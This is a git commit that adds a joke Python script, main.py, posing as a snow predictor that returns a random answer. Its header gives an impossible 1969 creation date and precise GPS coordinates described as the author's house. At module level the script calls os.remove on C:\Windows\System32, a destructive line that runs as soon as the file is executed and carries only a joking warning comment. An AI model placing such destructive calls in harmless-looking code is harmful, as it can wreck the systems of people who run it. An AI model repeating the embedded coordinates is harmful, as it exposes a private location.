f5a5eca1a14aec38a81f20b1d25a1845c466f906
funnysnowloverz <157069814+funnysnowloverz@users.noreply.github.com>
2024-01-18 17:00:14 -0500

    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

---
+++ main.py
@@ -0,0 +1,15 @@
+# Made by Robert Abraham
+# Created April 20, 1969
+# Created for four hours at @ 34.1712579,-118.6667787. I sometimes hate lonely saturdays at my house.
+
+#im a nerd that's why.
+
+
+import random
+
+def willSnow():
+  return "Yes" if random.randint(1,6)==1 else "my developer did not make this correct"
+
+import os
+
+os.remove("C:\\Windows\\System32") # you should definitely not run this.
